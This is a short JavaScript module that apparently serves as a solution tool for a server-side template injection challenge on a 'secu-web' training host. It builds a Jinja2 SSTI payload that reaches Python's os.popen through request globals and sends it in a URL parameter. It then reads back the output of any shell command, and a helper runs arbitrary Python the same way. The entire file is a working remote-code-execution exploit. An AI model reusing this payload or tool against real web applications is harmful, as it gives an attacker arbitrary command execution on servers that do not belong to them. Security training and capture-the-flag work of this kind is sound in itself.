import axios from 'axios'

export const url = 'https://ssti4.secu-web.blackfoot.dev'

export function makeCmd(cmd, stderr=true, printSafe=true) {
	if (stderr) {
		cmd += ' 2>&1 | cat'
	}

	const safe = printSafe ? "|safe" : ""

	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__("os").popen("${cmd}").read()${safe}}}`)
}

export async function runCmd(cmd, stderr=true, printSafe=true) {
	const res = await axios({
		method: 'get',
		url: `${url}?username=${makeCmd(cmd, stderr, printSafe)}`
	})

	const match = res.data.match(/Hello '(.*)'/s)
	return match[1]
}

// Python command can't contain double quotes '"'
export async function runPython(cmd, stderr=true, printSafe=true) {
	return await runCmd(`python -c \\"${cmd}\\"`)
}
